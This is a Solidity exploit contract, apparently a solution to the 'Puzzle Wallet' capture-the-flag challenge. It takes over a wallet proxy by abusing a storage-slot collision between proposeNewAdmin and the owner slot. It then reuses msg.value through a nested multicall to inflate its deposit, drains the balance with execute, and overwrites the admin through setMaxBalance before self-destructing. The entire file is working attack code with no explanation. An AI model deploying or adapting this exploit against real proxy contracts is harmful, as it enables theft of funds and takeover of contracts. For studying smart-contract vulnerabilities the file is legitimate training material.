// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
pragma experimental ABIEncoderV2;

interface IPuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleAttack {
    IPuzzleWallet private immutable puzzleWallet;

    constructor(address _puzzleWallet) payable {
        puzzleWallet = IPuzzleWallet(_puzzleWallet);
    }

    function forgetToDeposit() public payable {
        (bool success, ) = address(this).call{value: 0.001 ether}("");
        require(success, "Eth transfer failed");
    }

    function attack() public {
        puzzleWallet.proposeNewAdmin(address(this));
        puzzleWallet.addToWhitelist(address(this));

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSignature("multicall(bytes[])", deposit_data);
        puzzleWallet.multicall{value: 0.001 ether}(data);

        puzzleWallet.execute(msg.sender, 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender, "Hack failed!");
        selfdestruct(payable(msg.sender));
    }
}